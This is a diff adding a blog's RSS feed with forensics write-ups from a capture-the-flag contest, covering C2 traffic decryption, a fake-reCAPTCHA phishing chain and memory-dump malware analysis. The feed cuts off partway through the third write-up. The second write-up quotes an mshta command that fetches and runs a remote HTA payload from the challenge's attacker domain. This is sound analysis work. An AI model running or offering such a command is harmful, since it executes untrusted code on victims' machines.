@@ -1,0 +1,528 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SunCTF 2025 on</title><link>https://qiaonpc.github.io/categories/sunctf-2025/</link><description>Recent content in SunCTF 2025 on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 31 Aug 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://qiaonpc.github.io/categories/sunctf-2025/index.xml" rel="self" type="application/rss+xml"/><item><title>Get Clawed</title><link>https://qiaonpc.github.io/post/get-clawed/</link><pubDate>Sun, 31 Aug 2025 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/get-clawed/</guid><description>&lt;h1 id="get-clawed---ctf-challenge-writeup">Get Clawed - CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: Get Clawed&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 10&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Forensics&lt;/li>
+&lt;li>&lt;strong>Objective&lt;/strong>: Analyze a disk image and network traffic capture to uncover hidden data exfiltration techniques, reverse custom encryption mechanisms, and ultimately retrieve the attacker’s payload or flag.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;h3 id="1-initial-recon-ad1-file">1. &lt;strong>Initial Recon: AD1 File&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>Given two files:&lt;/p>
+&lt;ul>
+&lt;li>A forensic disk image (&lt;code>.ad1&lt;/code>)&lt;/li>
+&lt;li>A packet capture (&lt;code>.pcap&lt;/code>)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Inside the AD image:&lt;/p>
+&lt;ul>
+&lt;li>Nothing substantial at first glance.&lt;/li>
+&lt;li>A few anime images, some decoy files, and a suspicious file named &lt;code>golden-answer.clawed&lt;/code>.&lt;/li>
+&lt;li>The &lt;code>.clawed&lt;/code> file appeared to be a &lt;strong>custom encrypted blob&lt;/strong> — likely containing the flag.&lt;/li>
+&lt;li>&lt;a class="link" href="https://eqctf.com/" target="_blank" rel="noopener"
+>EQCTF&lt;/a> is also mentioned 👀 in the AD1 image file. For beginners looking to get into CTF, EQCTF is a great starting point. It is created by a team of legendary Malaysian CTF players.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="2-turning-to-the-network-traffic">2. &lt;strong>Turning to the Network Traffic&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>With the AD1 largely unhelpful, focus shifted to the &lt;code>.pcap&lt;/code> file.&lt;/li>
+&lt;li>Suspicious HTTP GET traffic containing &lt;code>?guid=&lt;/code> stood out — indicative of possible &lt;strong>C2-style communication&lt;/strong>.&lt;/li>
+&lt;li>This assumption stems from the fact that the values appeared &lt;strong>Base64-like&lt;/strong>, but standard decoding failed.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="3-leveraging-known-resources">3. &lt;strong>Leveraging Known Resources&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>After some digging, I found that my assumption was correct and it is a C2 communication.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/get-clawed/C2%20Image.png"
+width="1229"
+height="867"
+srcset="https://qiaonpc.github.io/post/get-clawed/C2%20Image_hu1b1ff42e256beeae799d82a497a7537e_139957_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/get-clawed/C2%20Image_hu1b1ff42e256beeae799d82a497a7537e_139957_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="TrevorC2"
+class="gallery-image"
+data-flex-grow="141"
+data-flex-basis="340px"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>I then discovered a &lt;strong>writeup from the same challenge author&lt;/strong>: &lt;a class="link" href="https://warlocksmurf.github.io/posts/cyberspacectf2024/" target="_blank" rel="noopener"
+>warlocksmurf.github.io - CyberspaceCTF2024&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The author provided a &lt;strong>Python script&lt;/strong> that could be reused for decrypting similarly obfuscated C2 traffic.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Using this script, the suspicious traffic was decrypted successfully.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/get-clawed/Use%20Script.png"
+width="1760"
+height="1006"
+srcset="https://qiaonpc.github.io/post/get-clawed/Use%20Script_hu8d2ba595266d4bf5dbd4aed28f0e4b22_575691_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/get-clawed/Use%20Script_hu8d2ba595266d4bf5dbd4aed28f0e4b22_575691_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Decoding C2 Traffic"
+class="gallery-image"
+data-flex-grow="174"
+data-flex-basis="419px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="4-c2-traffic-analysis">4. &lt;strong>C2 Traffic Analysis&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>The decrypted content revealed:&lt;/p>
+&lt;ul>
+&lt;li>A &lt;strong>GitHub Gist link&lt;/strong>&lt;/li>
+&lt;li>The Gist contained &lt;strong>Base64-encoded content&lt;/strong>, which when decoded turned out to be another script.&lt;/li>
+&lt;li>This script was a &lt;strong>basic XOR cipher&lt;/strong>, meant to encrypt/decrypt data.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/get-clawed/github%20link.png"
+width="1905"
+height="248"
+srcset="https://qiaonpc.github.io/post/get-clawed/github%20link_hu935ecbe779142bf78fbaed8bb2867963_105351_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/get-clawed/github%20link_hu935ecbe779142bf78fbaed8bb2867963_105351_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="GIST Link"
+class="gallery-image"
+data-flex-grow="768"
+data-flex-basis="1843px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="5-decrypting-golden-answerclawed">5. &lt;strong>Decrypting golden-answer.clawed&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>With the XOR script in hand, wrote a script to decrypt &lt;code>golden-answer.clawed&lt;/code> using the same XOR logic.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Upon decryption, the file revealed the &lt;strong>flag&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/get-clawed/flag.png"
+width="1288"
+height="594"
+srcset="https://qiaonpc.github.io/post/get-clawed/flag_hu0bb0a00dd2a2ae5e25189d06fe996644_166478_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/get-clawed/flag_hu0bb0a00dd2a2ae5e25189d06fe996644_166478_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="216"
+data-flex-basis="520px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="flag">Flag
+&lt;/h2>&lt;p>The flag for this challenge is:&lt;br>
+&lt;code>sunctf25{n0t_tr3v0r_fr0m_GTA}&lt;/code>&lt;/p></description></item><item><title>Stop fixing my clicks</title><link>https://qiaonpc.github.io/post/stop-fixing-my-clicks/</link><pubDate>Sun, 31 Aug 2025 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/stop-fixing-my-clicks/</guid><description>&lt;h1 id="stop-fixing-my-clicks---ctf-challenge-writeup">Stop fixing my clicks - CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: Stop fixing my clicks&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 10&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Forensics&lt;/li>
+&lt;li>&lt;strong>Objective&lt;/strong>: Investigate a phishing email and trace its payload chain through clipboard injection, remote code execution, and multiple layers of obfuscation. Identify and extract the attacker’s final payload and recover the embedded flag through reverse engineering or memory forensics.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;h3 id="1-initial-analysis-email-file">1. &lt;strong>Initial Analysis: Email File&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>The challenge starts with an &lt;strong>email artifact&lt;/strong>.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Decoding its &lt;strong>Base64 content&lt;/strong> revealed HTML designed to improve the visual presentation of the email.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The HTML included:&lt;/p>
+&lt;ul>
+&lt;li>A &lt;strong>phishing link&lt;/strong>&lt;/li>
+&lt;li>An &lt;strong>image&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Going to the phishing link led to a fake reCAPTCHA verification page, instructing the user to paste a value into Windows Registry — clearly suspicious behavior.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>There will not be images regarding this phishing website since the website has been taken down at the time of writing this writeup, not sure if its because the participants reported it or the organisers removed it.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/1.%20link.png"
+width="1547"
+height="931"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/1.%20link_hua77fb5296ac8ff04798c208e01482a47_224405_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/1.%20link_hua77fb5296ac8ff04798c208e01482a47_224405_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Link"
+class="gallery-image"
+data-flex-grow="166"
+data-flex-basis="398px"
+>&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/2.%20image.png"
+width="1548"
+height="934"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/2.%20image_hu59346013ba51992eb6888696f06f604d_457744_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/2.%20image_hu59346013ba51992eb6888696f06f604d_457744_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image"
+class="gallery-image"
+data-flex-grow="165"
+data-flex-basis="397px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="2-clipboard-injection">2. &lt;strong>Clipboard Injection&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>Surprisingly, browsing to the website and clicking a button will poppulate my clipboard the expected value, suggesting the site auto-injected content using JavaScript.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The clipboard-pasted command was:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mshta http://www.h0tbirdgl4z3rs.online/sameko_saba_exposed.mp4 &lt;span class="c1"># ✅ &amp;#39;&amp;#39;I am not a robot - reCAPTCHA Verification ID: 2165&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>This command uses &lt;strong>&lt;code>mshta&lt;/code>&lt;/strong>, a known Windows utility abused by attackers to fetch and execute &lt;code>.hta&lt;/code> payloads.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="3-fetching-the-payload">3. &lt;strong>Fetching the Payload&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>Used &lt;code>curl&lt;/code> to retrieve the HTA file manually.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The response contained a &lt;strong>PowerShell command&lt;/strong> with a &lt;strong>large Base64 blob&lt;/strong>.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Decoding this led to another &lt;strong>PowerShell script&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/3.%20downloaded%20contents.png"
+width="1538"
+height="781"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/3.%20downloaded%20contents_hucc5c1be50ee5be7c94dde23a672b03c8_94835_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/3.%20downloaded%20contents_hucc5c1be50ee5be7c94dde23a672b03c8_94835_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Downloaded Content"
+class="gallery-image"
+data-flex-grow="196"
+data-flex-basis="472px"
+>&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/Another%20Base64.png"
+width="1557"
+height="819"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/Another%20Base64_huf88177822a3514538612ab9dfb35b827_151730_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/Another%20Base64_huf88177822a3514538612ab9dfb35b827_151730_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Another Base64"
+class="gallery-image"
+data-flex-grow="190"
+data-flex-basis="456px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="4-executable-payload">4. &lt;strong>Executable Payload&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>Decoding the inner Base64 string revealed content beginning with &lt;strong>&lt;code>MZ&lt;/code>&lt;/strong>, indicating a &lt;strong>Windows executable&lt;/strong>.
+&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/Executable.png"
+width="1526"
+height="857"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/Executable_huef50cc8a6e515ab6051c0afe849a5220_169987_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/Executable_huef50cc8a6e515ab6051c0afe849a5220_169987_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Executable"
+class="gallery-image"
+data-flex-grow="178"
+data-flex-basis="427px"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The binary was downloaded and analyzed:&lt;/p>
+&lt;ul>
+&lt;li>Identified as a &lt;strong>Python-compiled executable&lt;/strong>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>When working with an EXE file, it’s important to identify the language it was compiled from—whether it’s .NET, Python, Rust, or something else. The decompilation process differs depending on the language used.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Tools like &lt;code>pyinstxtractor&lt;/code> and &lt;code>pycdc&lt;/code> were used to begin decompilation.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/5.%20python%20compiled%20executable.png"
+width="601"
+height="300"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/5.%20python%20compiled%20executable_hu345dc78439629f4909a08d7fbc550642_105268_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/5.%20python%20compiled%20executable_hu345dc78439629f4909a08d7fbc550642_105268_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Python Compiled Executable"
+class="gallery-image"
+data-flex-grow="200"
+data-flex-basis="480px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="5-obfuscation-barrier-pyarmor">5. &lt;strong>Obfuscation Barrier: PyArmor&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>Analysis revealed that the executable was protected with &lt;strong>PyArmor&lt;/strong>, a tool designed to obfuscate and encrypt Python code.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>PyArmor is notoriously difficult to reverse statically and I personally was not able to use any methods mentioned online.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/6.%20pyamor%20indication.png"
+width="1903"
+height="322"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/6.%20pyamor%20indication_hu05c1dae406e87432742b762c34b847fe_94913_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/6.%20pyamor%20indication_hu05c1dae406e87432742b762c34b847fe_94913_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="PyArmor"
+class="gallery-image"
+data-flex-grow="590"
+data-flex-basis="1418px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="6-memory-dump-strategy">6. &lt;strong>Memory Dump Strategy&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>I eventually gave up trying the methods suggested by most github and research papers and resorted to do something retarded, referenced from &lt;a class="link" href="https://medium.com/@keii./analysis-of-pyarmor-obfuscated-python-malware-without-deobfuscating-the-source-itsec-ctf-2025-240052f8ccc0" target="_blank" rel="noopener"
+>Medium Article&lt;/a>.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Talking to the challenge authors after the CTF, I found that this isnt the intended solution but conceptually it matches the intended solution.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The idea is to &lt;strong>execute the binary&lt;/strong>, then performed a &lt;strong>live memory dump&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/7.%20creare%20the%20dump%20files.png"
+width="1239"
+height="840"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/7.%20creare%20the%20dump%20files_hu034ddafe4ec4b8acec648559d79607ce_112079_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/7.%20creare%20the%20dump%20files_hu034ddafe4ec4b8acec648559d79607ce_112079_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Capture Memory"
+class="gallery-image"
+data-flex-grow="147"
+data-flex-basis="354px"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>After dumping memory, used &lt;code>grep&lt;/code> to search for URLs or strings of interest.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Discovered a &lt;strong>link to the attacker’s database&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/8.%20grep.png"
+width="1519"
+height="907"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/8.%20grep_hu76e26ded7d6cc39347dff0c811e931b8_910946_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/8.%20grep_hu76e26ded7d6cc39347dff0c811e931b8_910946_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Grep"
+class="gallery-image"
+data-flex-grow="167"
+data-flex-basis="401px"
+>&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/9.%20found%20link.png"
+width="1586"
+height="839"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/9.%20found%20link_hu9fdc0c03a4611806afab02acb81de756_702396_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/9.%20found%20link_hu9fdc0c03a4611806afab02acb81de756_702396_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Grep 2"
+class="gallery-image"
+data-flex-grow="189"
+data-flex-basis="453px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="7-flag-retrieval">7. &lt;strong>Flag Retrieval&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>The database contained a &lt;strong>ZIP archive&lt;/strong>, which appeared to contain the flag.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The archive was &lt;strong>password-protected&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/10.%20attacker%20databse%20file.png"
+width="1459"
+height="815"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/10.%20attacker%20databse%20file_hu77fc3076c017d25fe5d7cc47fe4cdd55_62112_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/10.%20attacker%20databse%20file_hu77fc3076c017d25fe5d7cc47fe4cdd55_62112_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Attacker Database File"
+class="gallery-image"
+data-flex-grow="179"
+data-flex-basis="429px"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Surprisingly, I see my hostname in the database as well 👀, meaning when I executed the binary for memory dumping, it actually captured by data and send it to the CTF server (attacker server). Please dont reveal my data zach/robbin.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Since the zip file is password protected, I attempted to crack it but it failed.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Continued grepping surrounding memory lines revealed &lt;strong>several potential password candidates&lt;/strong>.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>After trial-and-error with various strings found, one of them successfully unlocked the archive.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/11.%20found%20possible%20password%20entry.png"
+width="1015"
+height="955"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/11.%20found%20possible%20password%20entry_hu96d6cda2b069b3e55ad03e5f5d972d1f_356893_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/11.%20found%20possible%20password%20entry_hu96d6cda2b069b3e55ad03e5f5d972d1f_356893_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Possible Password"
+class="gallery-image"
+data-flex-grow="106"
+data-flex-basis="255px"
+>
+&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/12.%20password%20worked.png"
+width="940"
+height="872"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/12.%20password%20worked_hu92aa7e1526eb00623ec390cdf12f8a97_313090_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/12.%20password%20worked_hu92aa7e1526eb00623ec390cdf12f8a97_313090_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Password Worked"
+class="gallery-image"
+data-flex-grow="107"
+data-flex-basis="258px"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Inside: &lt;strong>the flag&lt;/strong>.
+&lt;img src="https://qiaonpc.github.io/post/stop-fixing-my-clicks/13.%20flag.png"
+width="1689"
+height="959"
+srcset="https://qiaonpc.github.io/post/stop-fixing-my-clicks/13.%20flag_hu50e521dc17ce16a6191755e8d6754c4f_684196_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/stop-fixing-my-clicks/13.%20flag_hu50e521dc17ce16a6191755e8d6754c4f_684196_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="176"
+data-flex-basis="422px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="flag">Flag
+&lt;/h2>&lt;p>The flag for this challenge is: &lt;code>sunctf25{A_v3ry_le9A1_d0CUM3NT}&lt;/code>&lt;/p></description></item><item><title>Sustainable Development Goals</title><link>https://qiaonpc.github.io/post/sustainable-development-goals/</link><pubDate>Sun, 31 Aug 2025 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/sustainable-development-goals/</guid><description>&lt;h1 id="sustainable-development-goals---ctf-challenge-writeup">Sustainable Development Goals - CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: Sustainable Development Goals&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 10&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Forensics&lt;/li>
+&lt;li>&lt;strong>Objective&lt;/strong>: Analyze a memory dump to identify post-exploitation artifacts, uncover suspicious process behavior, decrypt and execute in-memory payloads, and extract the attacker’s intended shellcode or flag.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;h3 id="1-choosing-a-tool-memprocfs-vs-volatility">1. &lt;strong>Choosing a Tool: memprocfs vs Volatility&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>Given a &lt;strong>memory dump&lt;/strong>, analysed it using memprocfs.&lt;/li>
+&lt;li>I chose to begin analysis with &lt;strong>memprocfs&lt;/strong> instead of Volatility due to its speed and usability.
+&lt;ul>
+&lt;li>&lt;strong>memprocfs&lt;/strong> offers real-time mounting of the memory image as a virtual file system, allowing quick browsing of processes, network connections, files, registry, environment variables, and even PowerShell history.&lt;/li>
+&lt;li>&lt;strong>Volatility&lt;/strong> was later used for &lt;strong>more niche plugins&lt;/strong> and &lt;strong>precise data extraction&lt;/strong> (e.g., environment variables).&lt;/li>
+&lt;li>&lt;strong>memprocfs&lt;/strong> is fast so I can quickly get an overview on what I should be doing to get flag.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="2-suspicious-process-discovery">2. &lt;strong>Suspicious Process Discovery&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>During enumeration of running processes, one stood out:
+&lt;ul>
+&lt;li>An instance of &lt;code>svchost.exe&lt;/code> executing from an &lt;strong>unusual path&lt;/strong>:&lt;br>
+&lt;code>C:\Users\sunwaylobster\Pictures\svchost.exe&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Red flags:
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>&lt;code>svchost.exe&lt;/code> is a legitimate Windows binary&lt;/strong>, but typically only runs from &lt;code>System32&lt;/code>, not &lt;code>Pictures&lt;/code>.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>It was &lt;strong>spawned by &lt;code>explorer.exe&lt;/code>&lt;/strong>, suggesting user-level execution.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Tracing the parent chain revealed it &lt;strong>originated from &lt;code>WINWORD.EXE&lt;/code>&lt;/strong> — a classic phishing vector (e.g., Word document macro).&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/sustainable-development-goals/1.%20sus%20process.png"
+width="1766"
+height="1005"
+srcset="https://qiaonpc.github.io/post/sustainable-development-goals/1.%20sus%20process_hu3be29ca571880c76abe2ab660d486f31_112437_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/sustainable-development-goals/1.%20sus%20process_hu3be29ca571880c76abe2ab660d486f31_112437_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Sus Process"
+class="gallery-image"
+data-flex-grow="175"
+data-flex-basis="421px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="3-analyzing-the-malicious-svchost">3. &lt;strong>Analyzing the Malicious svchost&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>Dumped and inspected the &lt;code>svchost.exe&lt;/code> binary.&lt;/li>
+&lt;li>It was &lt;strong>not the real Windows svchost&lt;/strong>, but rather &lt;strong>custom malicious code&lt;/strong>.&lt;/li>
+&lt;li>Behavior analysis showed it:
+&lt;ul>
+&lt;li>Decodes a payload intended for &lt;strong>process injection&lt;/strong>&lt;/li>
+&lt;li>Uses &lt;strong>AES encryption&lt;/strong> to protect the shellcode&lt;/li>
+&lt;li>Retrieves the &lt;strong>IV and AES key from environment variables&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="4-extracting-environment-variables">4. &lt;strong>Extracting Environment Variables&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>Used &lt;strong>Volatility&lt;/strong> to extract the environment variables of the malicious &lt;code>svchost&lt;/code> process.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Retrieved the &lt;strong>AES key and IV&lt;/strong>, enabling decryption of the embedded payload.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/sustainable-development-goals/2.%20Extracted%20envars.png"
+width="1530"
+height="860"
+srcset="https://qiaonpc.github.io/post/sustainable-development-goals/2.%20Extracted%20envars_hu95a89977d02560db34a334ae672b554e_807277_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/sustainable-development-goals/2.%20Extracted%20envars_hu95a89977d02560db34a334ae672b554e_807277_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Extracted Envars"
+class="gallery-image"
+data-flex-grow="177"
+data-flex-basis="426px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="5-decrypting-and-executing-the-shellcode">5. &lt;strong>Decrypting and Executing the Shellcode&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>Decrypted the encoded payload using the extracted key and IV.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Result: a &lt;strong>valid shellcode blob&lt;/strong>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Executed the shellcode in a controlled environment (emulator or debugger) to observe behavior.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Upon execution, the shellcode revealed the &lt;strong>flag&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/sustainable-development-goals/3.%20decrypted.png"
+width="1384"
